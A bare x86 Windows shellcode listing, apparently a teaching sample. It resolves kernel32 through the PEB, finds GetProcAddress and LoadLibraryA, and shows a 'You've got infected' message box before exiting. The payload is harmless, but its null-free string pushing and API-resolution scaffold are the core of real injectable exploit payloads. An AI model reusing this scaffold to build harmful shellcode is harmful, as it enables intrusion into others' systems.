; Find kernel32.dll base address
xor ecx, ecx
mov eax, fs:[ecx + 0x30]  ; EAX = PEB
mov eax, [eax + 0xc]      ; EAX = PEB->Ldr
mov esi, [eax + 0x14]     ; ESI = PEB->Ldr.InMemOrder
lodsd                     ; EAX = Second module
xchg eax, esi             ; EAX = ESI, ESI = EAX
lodsd                     ; EAX = Third(kernel32)
mov ebx, [eax + 0x10]     ; EBX = Base address

; Find the export table of kernel32.dll
mov edx, [ebx + 0x3c] ; EDX = DOS->e_lfanew
add edx, ebx          ; EDX = PE Header
mov edx, [edx + 0x78] ; EDX = Offset export table
add edx, ebx          ; EDX = Export table
mov esi, [edx + 0x20] ; ESI = Offset names table
add esi, ebx          ; ESI = Names table
xor ecx, ecx          ; EXC = 0

; Find GetProcAddress function name
Get_Function:
 
inc ecx                              ; Increment the ordinal
lodsd                                ; Get name offset
add eax, ebx                         ; Get function name
cmp dword ptr[eax], 0x50746547       ; GetP
jnz Get_Function
cmp dword ptr[eax + 0x4], 0x41636f72 ; rocA
jnz Get_Function
cmp dword ptr[eax + 0x8], 0x65726464 ; ddre
jnz Get_Function

; Find the address of GetProcAddress function
mov esi, [edx + 0x24]    ; ESI = Offset ordinals
add esi, ebx             ; ESI = Ordinals table
mov cx, [esi + ecx * 2]  ; CX = Number of function
dec ecx
mov esi, [edx + 0x1c]    ; ESI = Offset address table
add esi, ebx             ; ESI = Address table
mov edx, [esi + ecx * 4] ; EDX = Pointer(offset)
add edx, ebx             ; EDX = GetProcAddress

; Find the LoadLibrary function address
xor ecx, ecx    ; ECX = 0
push ebx        ; Kernel32 base address
push edx        ; GetProcAddress
push ecx        ; 0
push 0x41797261 ; aryA
push 0x7262694c ; Libr
push 0x64616f4c ; Load
push esp        ; "LoadLibrary"
push ebx        ; Kernel32 base address
call edx        ; GetProcAddress(LL)

; Load user32.dll library
add esp, 0xc    ; pop "LoadLibraryA"
pop ecx         ; ECX = 0
push eax        ; EAX = LoadLibraryA
push ecx
mov cx, 0x6c6c  ; ll
push ecx
push 0x642e3233 ; 32.d
push 0x72657375 ; user
push esp        ; "user32.dll"
call eax        ; LoadLibrary("user32.dll")

; Get MessageBoxA function address
add esp, 0x10                  ; Clean stack
mov edx, [esp + 0x4]           ; EDX = GetProcAddress
xor ecx, ecx                   ; ECX = 0
push ecx
mov ecx, 0x6141786f            ; oxAa
push ecx
sub dword ptr[esp + 0x3], 0x61 ; Remove "a"
push 0x42656761                ; ageB
push 0x7373654d                ; Mess
push esp                       ; "MessageBoxA"
push eax                       ; user32.dll address
call edx                       ; GetProc(MessageBoxA)

; Call MessageBoxA function
add esp, 0x14                   ; Cleanup stack
xor ecx, ecx                    ; ECX = 0
push ecx
mov ecx, 0x61646574             ; teda
push ecx
sub dword ptr[esp + 0x3], 0x61  ; Remove "a"
push 0x6365666e                 ; nfec
push 0x6920746f                 ; ot i
push 0x67206576                 ; ve g
push 0x27756f59                 ; You'
mov ebx, esp
xor ecx, ecx                    ; ECX = 0
push ecx
push 0x51547375                 ; usTQ
push 0x636b6572                 ; rekc
mov ecx, esp
xor edx, edx                    ; EDX = 0
push edx                        ; 0
push ecx                        ; rekcusTQ
push ebx                        ; You've got infected
xor edi, edi
push edi                        ; 0
call eax                        ; MessageBoxA(0, "You've got infected", "rekcusTQ", 0)

; Get ExitProcess function address
add esp, 0x4                    ; Clean stack
pop edx                         ; GetProcAddress
pop ebx                         ; kernel32.dll base address
mov ecx, 0x61737365             ; essa
push ecx
sub dword ptr [esp + 0x3], 0x61 ; Remove "a"
push 0x636f7250                 ; Proc
push 0x74697845                 ; Exit
push esp
push ebx                        ; kernel32.dll base address
call edx                        ; GetProc(Exec)

; Call the ExitProcess function
xor ecx, ecx ; ECX = 0
push ecx     ; Return code = 0
call eax     ; ExitProcess